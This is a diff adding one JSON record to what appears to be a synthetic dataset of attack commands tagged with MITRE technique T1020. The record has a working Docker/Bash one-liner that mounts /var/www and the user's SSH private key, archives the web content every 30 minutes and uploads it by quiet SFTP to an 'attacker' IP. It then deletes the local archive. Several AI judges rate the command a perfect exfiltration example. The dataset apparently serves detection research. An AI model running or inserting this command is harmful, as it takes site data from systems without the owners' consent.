@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_sftp --network host -v /var/www:/data:ro -v $HOME/.ssh/id_rsa:/keys/id_rsa:ro bitnami/ssh-client:latest bash -lc 'while true; do TS=$(date +%s); ARCH=/tmp/www_$TS.tgz; tar -C /data -cz . > \"$ARCH\"; sftp -q -i /keys/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@203.0.113.15 <<< \"put $ARCH /var/tmp/$(hostname)_www_$TS.tgz\"; rm -f \"$ARCH\"; sleep 1800; done'",
+  "explanation": "Schedules quiet, non-interactive SFTP uploads of archived web content from /var/www, repeating automatically.",
+  "rationale_steps": [
+    "Mounts /var/www read-only",
+    "Packages data into timestamped archives",
+    "Transfers with sftp in batch/quiet mode to avoid prompts and logs",
+    "Runs in a loop as a background container for automation"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-0476f615",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Docker invocation with valid flags and a correctly quoted bash loop using here-string, redirections, and balanced quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "It repeatedly compresses /var/www and non-interactively uploads the archive via SFTP using a key on a schedule, fitting automated exfiltration (T1020).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:46:19.265306Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid Docker and bash syntax, and correct use of variables and redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a Docker container that periodically (every 30 minutes) archives web content, transfers it via SFTP to an external server, and removes local evidence, aligning exactly with the T1020 technique description.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:46:22.772269Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitutions, and proper use of here-strings.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated, scheduled SFTP exfiltration of web content, aligning precisely with T1020's description of packaging, transfer, and scheduling.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:32:56.606758Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
